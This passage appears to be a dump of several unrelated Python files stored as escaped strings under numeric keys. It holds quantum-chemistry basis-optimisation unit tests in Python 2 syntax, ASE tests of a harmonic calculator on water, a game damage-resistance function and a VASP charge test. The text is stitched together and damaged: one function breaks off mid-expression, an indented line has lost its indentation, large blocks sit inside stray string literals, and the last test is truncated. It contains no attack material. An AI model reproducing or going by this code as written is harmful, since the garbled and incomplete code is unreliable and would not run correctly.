calc_vec(ss, driv)\n        cs = solve(lmat, mvec)\n        alpha = np.dot(cs, mvec)\n        w = ene + 0.5\n        ref = 1.88562800720386-0.362705406693342j\n        self.assertAlmostEqual(3.0*ref, alpha)\n\n    def test_deriv_one(self):\n\n        for (name, create) in [(\"STO\", STOs), (\"GTO\", GTOs)]:\n            n0 = 3\n            c0 = [1.1]\n            r0 = [2.5]\n            z0 = [1.1]\n            \n            calc = lambda zs: create().add(3, zs[0]).setup().at_r(r0, c0)[0]\n\n            stos = create()\n            stos.add(n0, z0)\n            stos.setup()\n            \n            dstos = one_deriv(stos, [True])\n            calc_dy = dstos.at_r(r0, c0)[0]\n            ref_dy  = num_pd_c1(calc, z0, 0.0001, 0)        \n            self.assertAlmostEqual(ref_dy, calc_dy)\n\n            ddstos = two_deriv(stos, [True])\n            calc_ddy = ddstos.at_r(r0, c0)[0]\n            ref_ddy  = num_pd2(calc, z0, 0.0001, 0, 0, method=\"c1\")\n            msg = \"Basis={0}, second derivative\\nref = {1}\\ncalc= {2}\\n\".format(name, ref_ddy, calc_ddy)\n            \n            self.assertAlmostEqual(ref_ddy, calc_ddy, msg=msg)\n\n    def test_deriv_three(self):\n        z0 = 0.52\n        r0 = 2.6\n        c0 = 1.2\n        #basis= lambda z: GTOs().add(3, [1.1, z, 3.3]).setup()\n        basis= lambda z: GTOs().add(3, 1.1).add(3, z).add(4, 3.3).setup()\n\n        ds = one_deriv(basis(z0), [False, True, False])\n        self.assertEqual(1, ds.size())\n\n        calc = lambda z: basis(z).at_r(r0, [0,c0,0])\n        ref_dy  = num_pd(calc, [z0], 0.0001, 0, method='c1')\n        calc_dy = ds.at_r(r0, [c0])\n        self.assertAlmostEqual(ref_dy, calc_dy)\n        \n    def test_grad_one(self):\n        z0 = [1.3-0.2j]\n        h_pi = H_Photoionization('1s->kp', \"length\")\n        basis  = STOs().add(2, z0).setup()\n        w = 1.0\n        calc_green = lambda z: vgh_green_h_pi(h_pi, basis, [True])(w)(z)[0]\n        (val, calc_grad, calc_hess) = vgh_green_h_pi(h_pi, basis, [True])(w)(z0)\n        ref_grad = num_pd(calc_green,  z0, 0.0001, 0,    method='c1')\n        ref_hess = num_pd2(calc_green, z0, 0.0001, 0, 0, method='c1')\n        self.assertAlmostEqual(calc_grad[0],   ref_grad)\n        self.assertAlmostEqual(calc_hess[0,0], ref_hess, places=6)\n\n    def test_opt_index(self):\n        self.assertEqual([],     get_opt_index([False, False]))\n        self.assertEqual([0, 1], get_opt_index([True, True]))\n        self.assertEqual([1, 3], get_opt_index([False, True, False, True]))\n        self.assertEqual([0, 2], get_opt_index([True, False, True]))\n\n    def test_gh_two(self):\n\n        z0 = [1.3-0.2j, 0.5-0.9j]\n        opt = [True, True]\n        h_pi = H_Photoionization('1s->kp', \"length\")\n        basis  = STOs().add(2, z0).setup()\n        w = 1.0\n        calc_green = lambda z: vgh_green_h_pi(h_pi, basis, opt)(w)(z)[0]\n        \n        (val, calc_grad, calc_hess) = vgh_green_h_pi(h_pi, basis, opt)(w)(z0)\n        ref_grad = ngrad(calc_green, z0, 0.0001, method='c1')\n        ref_hess = nhess(calc_green, z0, 0.0001, method='c1')\n        for i in range(2):\n            self.assertAlmostEqual(ref_grad[i], calc_grad[i])\n            for j in range(2):\n                self.assertAlmostEqual(ref_hess[i,j],\n                                       calc_hess[i,j], places=6)\n                \n    def test_gh_two_of_three_easy(self):\n        zs0 = [1.3-0.1j, 2.3-0.5j]\n        z2 = 0.4-0.4j\n        opt = [True, True, False]\n        h_pi = H_Photoionization('1s->kp', \"velocity\")\n        basis = STOs().add(2, 1.0).add(2,1.0).add(2,z2).setup()\n        w = 0.9\n        \n        calc_green = lambda z: vgh_green_h_pi(h_pi, basis, opt)(w)(z)[0]\n\n        (v, calc_g, calc_h) = vgh_green_h_pi(h_pi, basis, opt)(w)(zs0)\n        ref_g = ngrad(calc_green, zs0, 0.0001, method='c1')\n        ref_h = nhess(calc_green, zs0, 0.0001, method='c1')\n        for i in range(2):\n            self.assertAlmostEqual(ref_g[i], calc_g[i], places=5)\n            for j in range(2):\n                msg = \"ref= {0}\\ncalc={1}\\n(i,j)=({2},{3})\".format(ref_h[i,j],calc_h[i,j],i,j)\n                self.assertAlmostEqual(ref_h[i,j], calc_h[i,j], places=5, msg=msg)\n\n    def test_gh_one_of_two(self):\n        zs = [1.3-0.1j, 2.3-0.5j]\n        h_pi = H_Photoionization('1s->kp', \"velocity\")\n        basis = STOs().add(2, zs).setup()\n        w = 1.1\n\n        (v, calc_g, calc_h) = vgh_green_h_pi(h_pi, basis, [False, True])(w)([zs[1]])\n        (v, full_g, full_h) = vgh_green_h_pi(h_pi, basis, [True,  True])(w)(zs)\n\n        self.assertAlmostEqual(full_g[1], calc_g[0], places=5)\n        self.assertAlmostEqual(full_h[1,1], calc_h[0,0], places=5)\n                \n    def test_grad_two_of_three(self):\n        opt_zs0 = [1.3-0.1j, 2.3-0.5j]\n        z1 = 0.4-0.4j\n        zs_all = [opt_zs0[0], z1, opt_zs0[1]]\n        opt = [True,      False,  True]\n        h_pi = H_Photoionization('1s->kp', \"velocity\")\n        basis =  STOs().add(2, 1.0).add(2,z1).add(2, 1.0).setup()\n        w = 1.0\n        calc_green = lambda z: vgh_green_h_pi(h_pi, basis, opt)(w)(z)[0]\n\n        (v, calc_g, calc_h) = vgh_green_h_pi(h_pi, basis, opt)(w)(opt_zs0)\n        (v, full_g, full_h) = vgh_green_h_pi(h_pi, basis, [True,True,True])(w)(zs_all)\n        ref_g = ngrad(calc_green, opt_zs0, 0.0001, method='c1')\n        ref_h = nhess(calc_green, opt_zs0, 0.0001, method='c1')\n\n        self.assertAlmostEqual(full_h[0,0], calc_h[0,0], places=5)\n        self.assertAlmostEqual(full_h[0,2], calc_h[0,1], places=5)\n        self.assertAlmostEqual(full_h[2,0], calc_h[1,0], places=5)\n        self.assertAlmostEqual(full_h[2,2], calc_h[1,1], places=5)\n        \n        for i in range(2):\n            self.assertAlmostEqual(ref_g[i], calc_g[i], places=5)            \n            for j in range(2):\n                msg = \"ref= {0}\\ncalc={1}\\n(i,j)=({2},{3})\".format(ref_h[i,j],calc_h[i,j],i,j)\n                self.assertAlmostEqual(ref_h[i,j], calc_h[i,j], places=5, msg=msg)\n\n    def test_vgh_log(self):\n        opt_log_zs0 = [-2.0-0.3j, -1.0-0.1j]\n        opt = [True, True]\n        h_pi = H_Photoionization('1s->kp', \"velocity\")\n        basis =  GTOs().add(2, 1.0).add(2, 1.0).setup()\n        w = 1.0\n\n        vgh = vgh_log(vgh_green_h_pi(h_pi, basis, opt))(w)\n        calc_green = lambda log_zs: vgh(log_zs)[0]\n\n        (v, calc_g, calc_h) = vgh(opt_log_zs0)\n        ref_g = ngrad(calc_green, opt_log_zs0, 0.0001, method='c1')\n        ref_h = nhess(calc_green, opt_log_zs0, 0.0001, method='c1')\n\n        self.assertAlmostEqual(ref_g[0],   calc_g[0],   places=5)\n        self.assertAlmostEqual(ref_g[1],   calc_g[1],   places=5)\n        self.assertAlmostEqual(ref_h[0,0], calc_h[0,0], places=5)\n        self.assertAlmostEqual(ref_h[0,1], calc_h[0,1], places=5)        \n        self.assertAlmostEqual(ref_h[1,0], calc_h[1,0], places=5)\n        self.assertAlmostEqual(ref_h[1,1], calc_h[1,1], places=5)\n        \n    def test_opt_one(self):\n        h_pi = H_Photoionization('1s->kp', \"velocity\")\n        z0s = [0.6-0.6j]\n        opt = [True for z in z0s]\n        basis = STOs().add(2, z0s).setup()\n        w = 1.0\n        \n        res = newton(vgh_green_h_pi(h_pi, basis, opt)(w), z0s)\n\n        ## see calc/stoh/v_1/res.d\n        self.assertTrue(res.success)\n        self.assertAlmostEqual(1.0255886472-0.6955918398j, res.x[0])\n        self.assertAlmostEqual((0.361600808054165-0.371221793708147j)*3, res.val)\n\n    def test_opt_one_log(self):\n        \n        h_pi = H_Photoionization('1s->kp', \"velocity\")\n        var = VarTransComb([([0], VarTransLog())])\n        y0s = [np.log(0.6-0.6j)]\n        x0s = var.xis(y0s)\n        opt = [True for z in y0s]\n        \n        w = 1.0\n        \n        basis = STOs().add(2, x0s[0]).setup()\n        vgh_w_x = vgh_green_h_pi(h_pi, basis, opt)\n        vgh_y = vgh_var(vgh_w_x, var)\n        \n        res = newton(vgh_y(w), y0s)\n\n        ## see calc/stoh/v_1/res.d\n        self.assertTrue(res.success)\n        self.assertAlmostEqual(1.0255886472-0.6955918398j, var.xis(res.x)[0])\n        self.assertAlmostEqual((0.361600808054165-0.371221793708147j)*3, res.val)\n    \n    def test_opt_three(self):\n        h_pi = H_Photoionization('1s->kp', \"length\")\n        zs_opt = [0.9797019427  -0.0125136315j,\n                  0.8771210224  -0.6400667900j,\n                  0.3008012645  -1.0095895471j]\n        z0s = [z0 + 0.01 for z0 in zs_opt]\n        opt = [True for z in z0s]\n        basis = STOs().add(2, z0s).setup()\n        w = 0.9\n        res = newton(vgh_green_h_pi(h_pi, basis, opt)(w),\n                     z0s,\n                     tol=pow(10.0, -10),\n#                     out = sys.stdout,\n#                     print_level = 1,\n                     conv = \"dx\"\n                     )\n\n        ## see calc/stoh/l_3/res.d\n        self.assertTrue(res.success)\n        self.assertAlmostEqual(zs_opt[0], res.x[0])\n        self.assertAlmostEqual(zs_opt[1], res.x[1])\n        self.assertAlmostEqual(zs_opt[2], res.x[2])\n        self.assertAlmostEqual((2.23413256581075-0.543249555891283j)*3, res.val)\n        \n    def test_h_pi_read_info(self):\n        basis_info = [(\"id\",   True,  2, 0.6-0.4j),\n                      (\"id\",   True,  2, 0.2-0.7j),\n                      (\"log\",  True,  2, np.log(1.1)),\n                      (\"log\",  False, 2, np.log(2.3)),\n                      (\"geo\",  True,  2, 3, 0.1, 2.5),\n                      (\"shift\",True,  2, [0.15, 0.25], 0.1)]\n\n        ref_us = (STOs()\n                  .add(2, 0.6-0.4j)\n                  .add(2, 0.2-0.7j)\n                  .add(2, 1.1)\n                  .add(2, 2.3)\n                  .add(2, 0.1)\n                  .add(2, 0.1*2.5)\n                  .add(2, 0.1*2.5*2.5)\n                  .add(2, 0.15+0.1)\n                  .add(2, 0.25+0.1)\n                  .setup())\n\n        ref_var = VarTransComb([ ([0], VarTransId()),\n                                 ([1], VarTransId()),\n                                 ([2], VarTransLog()),\n                                 ([3,4,5], VarTransGeometric(3)),\n                                 ([6,7], VarTransShift([0.15, 2.5]))])\n\n        ref_opt_list = [True, True, True, False,\n                        True, True, True,\n                        True, True]\n\n        ref_y0s = [0.6-0.4j, 0.2-0.7j, np.log(1.1), 0.1, 2.5, 0.1]\n\n        (base_us, opt_list, var, y0s) = h_pi_read_info(\"STO\", basis_info)\n        c0 = [0.1 * (i+1) for i in range(ref_us.size())]\n        r0 = [1.1]\n        self.assertAlmostEqual(ref_us.at_r(r0, c0)[0], base_us.at_r(r0, c0)[0])\n        self.assertEqual(ref_opt_list, opt_list)\n        self.assertVecAlmostEqual(ref_y0s, y0s)\n        self.assertVarEqual(ref_var, var)\n        \n    def test_opt_interface(self):\n\n        opt_main(\n            basis_type = 'STO',\n            basis_info = [(\"id\",   True,  2, 0.6-0.4j)],\n            w0 = 1.0,\n#            ws = np.linspace(0.5, 1.5, 11),\n            tol = pow(10.0, -5.0),\n            target = 'h_pi',\n            channel= '1s->kp',\n            dipole = 'velocity',\n            outfile = \"tmp.out\",\n            print_level = 3,\n            fdif = 0.01,\n            grad = False,\n            hess = False)\n\n        # False, False  => y0: (1.025588652-0.695591840159j)\n        # True,  True   => y0: (1.02558864721-0.695591839889j)\n        \"\"\"\n\n        opt_main(\n            basis_type = 'STO',\n            basis_info = [(\"log\",   True, 2, np.log(0.6-0.6j))],\n            w0 = 1.0,\n            tol = pow(10.0, -5.0),\n            target = 'h_pi',\n            channel= '1s->kp',\n            dipole = 'velocity',\n            maxit = 100,\n            outfile = \"tmp.out\",\n            print_level = 0)\n\n        opt_main(\n            basis_type = 'GTO',\n            basis_info = [\n                (\"geo\", False,  2, 15, 0.01, 1.771600539669121),\n                (\"log\",  True,   2, np.log(0.004-0.02j))],\n            w0 = 1.0,\n#            ws = np.linspace(0.5, 1.5, 11),\n            tol = pow(10.0, -8.0),\n            target = 'h_pi',\n            channel= '1s->kp',\n            dipole = 'velocity',\n#            outfile = \"tmp.out\",\n            print_level = 0)\n   \"\"\"\n\n\"\"\"\n\n\nclass Test_r1gtos(unittest.TestCase):\n    def setUp(self):\n        self.gtos = GTOs()\nself.gtos.add(2, 1.1)\n        self.gtos.add(3, [1.2, 1.3-0.1j])\n        self.gtos.add_lc([(1.0, 1, 1.5), (1.1, 4, 1.4)])\n        self.gtos.setup()\n\n    def test_size(self):\n        self.assertEqual(5, self.gtos.size_prim())\n        self.assertEqual(4, self.gtos.size_basis())\n\n    def test_param(self):\n        self.assertEqual(2, self.gtos.n_prim(0))\n        self.assertEqual(3, self.gtos.n_prim(1))\n        self.assertEqual(3, self.gtos.n_prim(2))\n        self.assertEqual(1, self.gtos.n_prim(3))\n        self.assertEqual(4, self.gtos.n_prim(4))\n\n        self.assertEqual(1.1, self.gtos.z_prim(0))\n        self.assertEqual(1.2, self.gtos.z_prim(1))\n        self.assertEqual(1.3-0.1j, self.gtos.z_prim(2))\n        self.assertEqual(1.5, self.gtos.z_prim(3))\n        self.assertEqual(1.4, self.gtos.z_prim(4))\n\n    def test_set_conj(self):\n        cg = self.gtos.conj()\n        self.assertAlmostEqual(1.1, cg.z(0))\n        self.assertAlmostEqual(1.3+0.1j, cg.z(2))\n        (s, t, v) = cg.calc_mat_stv(self.gtos, 1)\n        stos = R1STOs(); \n        stos.add(1.1, 2, 1.2)\n        v1 = cg.calc_mat_sto(self.gtos, stos)\n        print v1\n\n    def test_matrix(self):\n        (s,t,v) = self.gtos.calc_mat_stv(1)\n        self.assertAlmostEqual(1.0, s[0, 0])\n        self.assertAlmostEqual(1.0, s[1, 1])\n\n        s2 = MatrixXc.Zero(1, 1)\n        t2 = MatrixXc.Zero(1, 1)\n        v2 = MatrixXc.Zero(1, 1)\n        self.gtos.calc_mat_stv(1, s2, t2, v2)\n        self.assertAlmostEqual(t2[0, 1], t[0, 1])\n\n    def test_vector(self):\n        stos = R1STOs()\n        stos.add(1.1, 2, 1.2)\n        stos.add(1.1-0.2j, 3, 1.3)\n        m = self.gtos.calc_vec_sto(stos)\n\n    def test_print(self):\n        s = R1STO(1.0, 2, 1.1)\n        print s\n\n    def test_at_r(self):\n        gs = R1GTOs()\n        gs.add(2, 1.2)\n        gs.normalize()\n        print gs.at_r([1.3], [1.1])[0]\n        print gs.deriv_at_r([1.3], [1.1])[0]\n        print gs.deriv_2_at_r([1.3], [1.1])[0]\n\n\nclass Test_Opt(unittest.TestCase):\n    def setUp(self):\n        pass\n\n    def test_opt(self):\n        sto = R1STOs()\n        sto.add(2, 1.1)\n        driv = DrivSTO(sto)\n        \n        op = OpCoulomb(1, 0.5)\n        \n        zs = [0.2-0.1j, 0.8-0.5j]\n        gs = R1GTOs()\n        gs.add(2, zs)\n        gs.normalize()\n\n        target = OptAlpha(driv, op, gs)\n\n        optimizer = OptNewton(100, 10.0**(-5), target, 0)\n        res = optimizer.optimize(zs)\n        \n        self.assertTrue(res.conv_q)\n\n    def test_opt_partial(self):\n        sto = R1STOs(); sto.add(2, 1.0)\n        driv = DrivSTO(sto);\n        op   = OpCoulomb(1, 0.5)\n\n        zs = [0.2-0.1j, 0.8-0.5j]\n        gs = R1GTOs(); gs.add(2, zs); gs.normalize()\n        target = OptAlphaPartial(driv, op, gs, [1])\n        \n        optimizer = OptNewton(100, 10.0**(-5), target, 0)\n        res = optimizer.optimize([zs[1]])\n        \n        self.assertTrue(res.conv_q)\n\n    def test_opt_alpha_shift(self):\n        gs = R1GTOs()\n        zs = [0.463925,\n              1.202518,\n              3.379649,\n              10.6072,\n              38.65163,\n              173.5822,\n              1170.498,\n              0.16934112166516593,\n              0.08989389391311804,\n              0.055610873913491725,\n              0.03776599632952126,\n              0.02731159914174668,\n              0.020665855224060142,\n              0.016180602421004654,\n              0.013011569667967734]\n        gs.add(2, zs)\n        gs.normalize()\n        \n        sto = R1STOs()\n        sto.add(2.0, 2, 1.0)\n        driv = DrivSTO(sto)\n        \n        op = OpCoulomb(1, 0.5)\n\n        opt_idx = [7, 8, 9, 10, 11, 12, 13, 14];\n        target = OptAlphaShift(driv, op, gs, opt_idx)\n        optimizer = OptNewton(100, 10**(-5), target, 0)\n        res = optimizer.optimize(-0.02j)\n        \n        self.assertTrue(res.conv_q)\n        shift_ref = -0.00293368-0.0204361j\n        self.assertAlmostEqual(shift_ref, res.zs[0], places=4);\n        alpha_ref = -5.6568937518988989+1.0882823480377297j\n        self.assertAlmostEqual(alpha_ref, res.val)\n\n\"\"\"         \nif __name__ == '__main__':\n    unittest.main()\n", "91": "import numpy as np\nfrom numpy.testing import assert_array_almost_equal\nfrom ase import Atoms\nfrom ase.calculators.harmonic import HarmonicForceField, HarmonicCalculator\nfrom ase.calculators.calculator import CalculatorSetupError, CalculationFailed\nfrom ase.calculators.emt import EMT\nfrom ase.optimize import BFGS\nfrom ase.vibrations import Vibrations\nfrom ase.units import fs\nimport pytest\n\nref_pos = np.asarray([[8.7161, 7.96276, 8.48206], [8.60594, 8.04985, 9.44464],\n                      [8.0154, 8.52264, 8.10545]])\nref_atoms = Atoms('OH2', positions=ref_pos)  # relaxed water molecule\nref_energy = -14.222189  # y shift of the 'parabola' (harmonic potential)\n\n# example Hessian matrix as obtained from DFT\nhessian_x = np.asarray([[2.82630333e+01, -2.24763667e+01, 7.22478333e+00,\n                         -2.96970000e+00, 2.34363333e+00, 2.72788333e+00,\n                         -2.52159833e+01, 2.01307833e+01, -9.94651667e+00],\n                        [-2.24763667e+01, 1.78621333e+01, -5.77378333e+00,\n                         2.33703333e+00, -1.85276667e+00, -2.15118333e+00,\n                         2.01258667e+01, -1.60350833e+01, 7.93248333e+00],\n                        [7.22478333e+00, -5.77378333e+00, 5.72735000e+01,\n                         7.25470000e+00, -5.75313333e+00, -4.69477333e+01,\n                         -1.44613000e+01, 1.15504833e+01, -1.03523333e+01],\n                        [-2.96970000e+00, 2.33703333e+00, 7.25470000e+00,\n                         2.96170000e+00, -2.36901667e+00, -3.76841667e+00,\n                         -2.83833333e-02, 3.06833333e-02, -3.49190000e+00],\n                        [2.34363333e+00, -1.85276667e+00, -5.75313333e+00,\n                         -2.36901667e+00, 1.89046667e+00, 2.95495000e+00,\n                         2.90666667e-02, -1.80666667e-02, 2.79565000e+00],\n                        [2.72788333e+00, -2.15118333e+00, -4.69477333e+01,\n                         -3.76841667e+00, 2.95495000e+00, 4.89340000e+01,\n                         1.03146667e+00, -8.18450000e-01, -1.96118333e+00],\n                        [-2.52159833e+01, 2.01258667e+01, -1.44613000e+01,\n                         -2.83833333e-02, 2.90666667e-02, 1.03146667e+00,\n                         2.52034000e+01, -2.01516833e+01, 1.34293167e+01],\n                        [2.01307833e+01, -1.60350833e+01, 1.15504833e+01,\n                         3.06833333e-02, -1.80666667e-02, -8.18450000e-01,\n                         -2.01516833e+01, 1.60592333e+01, -1.07369667e+01],\n                        [-9.94651667e+00, 7.93248333e+00, -1.03523333e+01,\n                         -3.49190000e+00, 2.79565000e+00, -1.96118333e+00,\n                         1.34293167e+01, -1.07369667e+01, 1.23150000e+01]])\n\n\ndef assert_water_is_relaxed(atoms):\n    forces = atoms.get_forces()\n    assert np.allclose(np.zeros(forces.shape), forces)\n    assert np.allclose(ref_energy, atoms.get_potential_energy())\n    assert np.allclose(atoms.get_angle(1, 0, 2), ref_atoms.get_angle(1, 0, 2))\n    assert np.allclose(atoms.get_distance(0, 1), ref_atoms.get_distance(0, 1))\n    assert np.allclose(atoms.get_distance(0, 2), ref_atoms.get_distance(0, 2))\n\n\ndef run_optimize(atoms):\n    opt = BFGS(atoms)\n    opt.run(fmax=1e-9)\n\n\ndef test_cartesians():\n    \"\"\"In Cartesian coordinates the first 6 trash eigenvalues (translations and\n    rotations) can be slightly different from zero; hence set them to zero\n    using an increased parameter zero_thresh.\n    \"\"\"\n    zero_thresh = 0.06  # set eigvals to zero if abs(eigenvalue) < zero_thresh\n    hff = HarmonicForceField(ref_atoms=ref_atoms, ref_energy=ref_energy,\n                             hessian_x=hessian_x, zero_thresh=zero_thresh)\n    assert np.allclose(hff.hessian_q, hff.hessian_x)\n    atoms = ref_atoms.copy()\n    atoms.calc = HarmonicCalculator(hff)\n    assert_water_is_relaxed(atoms)  # atoms has not been distorted\n    run_optimize(atoms)             # nothing should happen\n    assert_water_is_relaxed(atoms)  # atoms should still be relaxed\n    atoms.set_distance(0, 1, 3.5)   # now distort atoms along axis, no rotation\n    run_optimize(atoms)             # optimization should recover original\n    assert_water_is_relaxed(atoms)    # relaxed geometry\n\n    with pytest.raises(AssertionError):\n        atoms.rattle()                  # relaxation should fail to recover the\n        atoms.rotate(90, 'x')           # original geometry of the atoms,\n        run_optimize(atoms)             # because Cartesian coordinates are\n        assert_water_is_relaxed(atoms)  # not rotationally invariant.\n\n\ndef test_constraints_with_cartesians():\n    \"\"\"Project out forces along x-component of H-atom (index 0 in the q-vector\n    with the Cartesian coordinates (here: x=q)). A change in the x-component of\n    the H-atom should not result in restoring forces, when they were projected\n    out from the Hessian matrix.\n    \"\"\"\n    def test_forces(calc):\n        atoms = ref_atoms.copy()\n        atoms.calc = calc\n        pos = ref_pos.copy()\n        pos[0, 0] *= 2\n        atoms.set_positions(pos)\n        run_optimize(atoms)  # (no) restoring force along distorted x-component\n        xdiff = atoms.get_positions() - ref_pos\n        return all(xdiff[xdiff != 0] == pos[0, 0] / 2)\n\n    zero_thresh = 0.06  # set eigvals to zero if abs(eigenvalue) < zero_thresh\n    parameters = {'ref_atoms': ref_atoms, 'ref_energy': ref_energy,\n                  'hessian_x': hessian_x, 'zero_thresh': zero_thresh}\n    hff = HarmonicForceField(**parameters)\n    calc = HarmonicCalculator(hff)\n    assert not test_forces(calc)  # restoring force along distorted x-component\n\n    parameters['constrained_q'] = [0]  # project out the coordinate with index 0\n    hff = HarmonicForceField(**parameters)\n    calc = HarmonicCalculator(hff)\n    assert test_forces(calc)  # no restoring force along distorted x-component\n\n\ndef setup_water(calc):\n    atoms = ref_atoms.copy()\n    atoms.calc = calc\n    assert_water_is_relaxed(atoms)\n    atoms.rattle(0.3)\n    atoms.rotate(160, 'x')\n    assert not np.allclose(ref_energy, atoms.get_potential_energy())\n    return atoms\n\n\n# start doc example 3\ndist_defs = [[0, 1], [1, 2], [2, 0]]  # define three distances by atom indices\n\n\ndef water_get_q_from_x(atoms):\n    \"\"\"Simple internal coordinates to describe water with three distances.\"\"\"\n    q_vec = [atoms.get_distance(i, j) for i, j in dist_defs]\n    return np.asarray(q_vec)\n\n\ndef water_get_jacobian(atoms):\n    \"\"\"Function to return the Jacobian for the water molecule described by\n    three distances.\"\"\"\n    from ase.geometry.geometry import get_distances_derivatives\n    pos = atoms.get_positions()\n    dist_vecs = [pos[j] - pos[i] for i, j in dist_defs]\n    derivs = get_distances_derivatives(dist_vecs)\n    jac = []\n    for i, defin in enumerate(dist_defs):\n        dqi_dxj = np.zeros(ref_pos.shape)\n        for j, deriv in enumerate(derivs[i]):\n            dqi_dxj[defin[j]] = deriv\n        jac.append(dqi_dxj.flatten())\n    return np.asarray(jac)\n# end doc example 3\n\n\ndef test_raise_Errors():\n    with pytest.raises(CalculatorSetupError):\n        HarmonicForceField(ref_atoms=ref_atoms, hessian_x=hessian_x,\n                           get_q_from_x=lambda x: x)\n    with pytest.raises(CalculatorSetupError):\n        HarmonicForceField(ref_atoms=ref_atoms, hessian_x=hessian_x,\n                           variable_orientation=True)\n    with pytest.raises(CalculatorSetupError):\n        HarmonicForceField(ref_atoms=ref_atoms, hessian_x=hessian_x,\n                           cartesian=False)\n    with pytest.raises(CalculationFailed):\n        hff = HarmonicForceField(ref_atoms=ref_atoms, ref_energy=ref_energy,\n                                 hessian_x=hessian_x,\n                                 get_q_from_x=water_get_q_from_x,\n                                 get_jacobian=lambda x: np.ones((3, 9)),\n                                 cartesian=True, variable_orientation=True)\n        calc = HarmonicCalculator(hff)\n        setup_water(calc)\n\n\ndef test_internals():\n    parameters = {'ref_atoms': ref_atoms, 'ref_energy': ref_energy,\n                  'hessian_x': hessian_x, 'get_q_from_x': water_get_q_from_x,\n                  'get_jacobian': water_get_jacobian, 'cartesian': False}\n    hff = HarmonicForceField(**parameters)  # calculation in internals\n    calc = HarmonicCalculator(hff)\n    atoms = setup_water(calc)  # distorted copy of ref_atoms\n    run_optimize(atoms)        # recover original configuration\n    assert_water_is_relaxed(atoms)\n\n    parameters['cartesian'] = True  # calculation in Cartesian Coordinates\n    hff = HarmonicForceField(**parameters)\n    calc = HarmonicCalculator(hff)\n    atoms = setup_water(calc)       # 'variable_orientation' not set to True!\n    # but water has rotational degrees of freedom\n    run_optimize(atoms)\n    with pytest.raises(AssertionError):  # hence forces were incorrect\n        assert_water_is_relaxed(atoms)   # original configuration not recovered\n\n    parameters['variable_orientation'] = True\n    hff = HarmonicForceField(**parameters)\n    calc = HarmonicCalculator(hff)\n    atoms = setup_water(calc)\n    run_optimize(atoms)\n    assert_water_is_relaxed(atoms)  # relaxation succeeded despite rotation\n\n\ndef test_compatible_with_ase_vibrations():\n    atoms = ref_atoms.copy()\n    atoms.calc = EMT()\n    run_optimize(atoms)\n    opt_atoms = atoms.copy()\n    opt_energy = atoms.get_potential_energy()\n    vib = Vibrations(atoms, nfree=2)\n    vib.run()\n    energies = vib.get_energies()\n    vib_data = vib.get_vibrations()\n    hessian_2d = vib_data.get_hessian_2d()\n    vib.clean()\n\n    hff = HarmonicForceField(ref_atoms=opt_atoms, ref_energy=opt_energy,\n                             hessian_x=hessian_2d)\n    calc_harmonic = HarmonicCalculator(hff)\n    atoms = ref_atoms.copy()\n    atoms.calc = calc_harmonic\n    vib = Vibrations(atoms, nfree=4, delta=1e-5)\n    vib.run()\n    assert np.allclose(energies, vib.get_energies())\n    vib.clean()\n    hff = HarmonicForceField(ref_atoms=ref_atoms, ref_energy=ref_energy,\n                             hessian_x=hessian_2d,\n                             get_q_from_x=water_get_q_from_x,\n                             get_jacobian=water_get_jacobian, cartesian=True)\n    calc_harmonic = HarmonicCalculator(hff)\n    atoms = ref_atoms.copy()\n    atoms.calc = calc_harmonic\n    vib = Vibrations(atoms, nfree=4, delta=1e-5)\n    vib.run()  # 3 transl and 3 rot are removed by internal coordinates\n    assert_array_almost_equal(energies[-3:], vib.get_energies()[-3:], decimal=2)\n\n\ndef test_thermodynamic_integration():\n    from ase.calculators.mixing import MixedCalculator\n    from ase.md.velocitydistribution import (MaxwellBoltzmannDistribution,\n                                             Stationary, ZeroRotation)\n    from ase.md.andersen import Andersen\n    parameters = {'ref_atoms': ref_atoms, 'ref_energy': ref_energy,\n                  'hessian_x': hessian_x, 'get_q_from_x': water_get_q_from_x,\n                  'get_jacobian': water_get_jacobian, 'cartesian': True,\n                  'variable_orientation': True}\n    hff_1 = HarmonicForceField(**parameters)\n    calc_harmonic_1 = HarmonicCalculator(hff_1)\n    parameters['cartesian'] = False\n    hff_0 = HarmonicForceField(**parameters)\n    calc_harmonic_0 = HarmonicCalculator(hff_0)\n    ediffs = {}  # collect energy difference for varying lambda coupling\n    lambs = [0.00, 0.25, 0.50, 0.75, 1.00]  # integration grid\n    for lamb in lambs:\n        ediffs[lamb] = []\n        calc_linearCombi = MixedCalculator(calc_harmonic_0, calc_harmonic_1,\n                                           1 - lamb, lamb)\n        atoms = ref_atoms.copy()\n        atoms.calc = calc_linearCombi\n        MaxwellBoltzmannDistribution(atoms, temperature_K=300, force_temp=True)\n        Stationary(atoms)\n        ZeroRotation(atoms)\n        with Andersen(atoms, 0.5 * fs, temperature_K=300, andersen_prob=0.05,\n                      fixcm=False) as dyn:\n            for _ in dyn.irun(50):  # should be much longer for production runs\n                e0, e1 = calc_linearCombi.get_energy_contributions(atoms)\n                ediffs[lamb].append(float(e1) - float(e0))\n            ediffs[lamb] = np.mean(ediffs[lamb])\n    dA = np.trapz([ediffs[lamb] for lamb in lambs], x=lambs)  # anharm. corr.\n    assert -0.005 < dA < 0.005  # the MD run is to short for convergence\n    if dA == 0.0:\n        raise ValueError('there is most likely something wrong, but it could '\n                         'also be sheer coincidence')\n", "92": "import buff\ndef DEF_RES(basic_RES,RES_Dec = 0,enemy = 93,player = 90):\n    \"\u9632\u5fa1\u6297\u6027\u4e58\u533a\u8ba1\u7b97\"\n    RES = basic_RES - RES_Dec\n    if(RES<=0):\n        return (100.0+player)/(200.0+enemy+player)*(1-RES/2)\n    elif(0", "93": "import pytest\nfrom ase.build import bulk\n\ncalc = pytest.mark.calculator\n\n\n@pytest.fixture\ndef system():\n    return bulk('Al', 'fcc', a=4.5, cubic=True)\n\n\n@calc('vasp')\ndef test_vasp_net_charge(factory, system):\n    \"\"\"\n    Run VASP tests to ensure that determining number of electrons from\n    user-supplied net charge (via the deprecated net_charge parameter) works\n    correctly. This is conditional on the existence of the VASP_COMMAND or\n    VASP_SCRIPT environment variables.\n\n    This is mainly a slightly reduced duplicate of the vasp_charge test, but with\n    flipped signs and with checks that ensure FutureWarning is emitted.\n\n    Should be removed along with the net_charge parameter itself at some point.\n    \"\"\"\n\n    # Dummy calculation to let VASP determine default number of electrons\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False)\n    calc.calculate(system)\n    default_nelect_from_vasp = calc.get_number_of_electrons()\n    assert default_nelect_from_vasp == 12\n\n    # Compare VASP's output nelect from before + net charge to default nelect\n    # determined by us + net charge\n    with pytest.warns(FutureWarning):\n        net_charge = -2\n        calc = 